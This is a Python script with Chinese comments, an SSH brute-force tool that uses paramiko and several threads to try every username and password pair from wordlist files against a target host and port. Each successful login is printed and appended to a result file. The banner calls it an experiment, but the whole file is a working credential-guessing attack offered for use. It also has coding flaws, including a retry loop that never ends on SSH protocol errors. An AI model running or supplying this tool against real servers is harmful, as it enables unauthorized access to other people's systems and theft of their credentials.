#!/usr/bin/python3
# -*- coding: utf-8 -*-

import optparse
import sys
import os
import threading
import paramiko

class ThreadWork(threading.Thread):
    def __init__(self, ip, username_block, password_block, port):
        """
        类的构造函数，初始化 IP 地址、用户名块、密码块和端口号
        """
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.username_block = username_block
        self.password_block = password_block

    def run(self, username, password):
        """
        根据传入的用户名和密码进行 SSH 登录尝试
        """
        while True:
            try:
                # 设置 SSH 日志文件
                paramiko.util.log_to_file("SSHattack.log")
                # 创建 SSH 客户端对象
                ssh = paramiko.SSHClient()
                # 接受不在本地 Known_host 文件下的主机
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                # 显示正在尝试的用户名、密码和 IP 地址
                sys.stdout.write(f"[*]ssh[{username}:{password}:{self.port}] => {self.ip}\n")
                # 尝试 SSH 连接
                ssh.connect(hostname=self.ip, port=self.port, username=username, password=password, timeout=10)
                # 关闭 SSH 连接
                ssh.close()
                # 登录成功，显示用户名和密码，并写入结果文件
                print(f"[+]success!!! username: {username}, password: {password}")
                with open('result', 'a') as resultFile:
                    resultFile.write(f"success!!! username: {username}, password: {password}")
                # 正常退出程序
                os._exit(0)
            except paramiko.ssh_exception.AuthenticationException as e:
                # 捕获认证失败异常，跳出循环
                break
            except paramiko.ssh_exception.SSHException as e:
                # 捕获 SSH 协议错误异常，继续尝试
                pass

    def start(self):
        """
        遍历用户名和密码块，调用 run 方法进行爆破
        """
        for user_item in self.username_block:
            for pwd_item in self.password_block:
                self.run(user_item, pwd_item)

# 列表分块函数
def partition(lst, num):
    """
    将列表按指定数量进行分块
    """
    # 计算每个子列表的长度
    step = int(len(lst) / num)
    # 若子列表不够除为 0 时，将 step 设置为子线程数
    if step == 0:
        step = num
    # 分割列表
    part_list = [lst[i:i+step] for i in range(0, len(lst), step)]
    return part_list

def ssh_exploit(ip, username_file, password_file, thread_number, ssh_port):
    """
    对 SSH 服务器进行暴力破解
    """
    print("============爆破信息============")
    print(f"IP:{ip}")
    print(f"用户名文件:{username_file}")
    print(f"密码文件:{password_file}")
    print(f"线程数:{thread_number}")
    print(f"端口:{ssh_port}")
    print("=================================")
    # 读取用户名和密码文件，存储到列表中
    list_username = [line.strip() for line in open(username_file)]
    list_password = [line.strip() for line in open(password_file)]
    # 对用户名和密码列表进行分块处理
    block_username = partition(list_username, thread_number)
    block_password = partition(list_password, thread_number)
    threads = []
    # 为每个用户名和密码子块创建线程
    for son_user_block in block_username:
        for son_pwd_block in block_password:
            # 实例化任务
            work = ThreadWork(ip, son_user_block, son_pwd_block, ssh_port)
            # 创建线程
            work_thread = threading.Thread(target=work.start)
            # 将线程添加到线程列表中
            threads.append(work_thread)
    # 启动所有线程
    for t in threads:
        t.start()
    # 等待所有线程完成
    for t in threads:
        t.join()

if __name__ == '__main__':
    print("\n#####################################")
    print("#          SSH  experiment         #")
    print("#####################################\n")
    # 创建命令行参数解析器
    parser = optparse.OptionParser('用法: python %prog target [options] \n\n示例: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n')
    # 添加目标主机参数 -i
    parser.add_option('-i', '--ip', dest='IP',
                      default='127.0.0.1', type='string',
                      help='目标 IP')
    # 添加线程参数 -t
    parser.add_option('-t', '--threads', dest='threadNum',
                      default=10, type='int',
                      help='线程数量 [默认 = 10]')
    # 添加用户名文件参数 -u
    parser.add_option('-u', '--username', dest='userName',
                      default='./username', type='string',
                      help='用户名文件')
    # 添加密码文件参数 -p
    parser.add_option('-p', '--password', dest='passWord',
                      default='./password', type='string',
                      help='密码文件')
    # 添加 SSH 端口参数 -P
    parser.add_option('-P', '--port', dest='port',
                      default='22', type='string',
                      help='SSH 端口')
    # 解析命令行参数
    (options, args) = parser.parse_args()
    # 启动 SSH 暴力破解
    ssh_exploit(options.IP, options.userName, options.passWord, options.threadNum, options.port)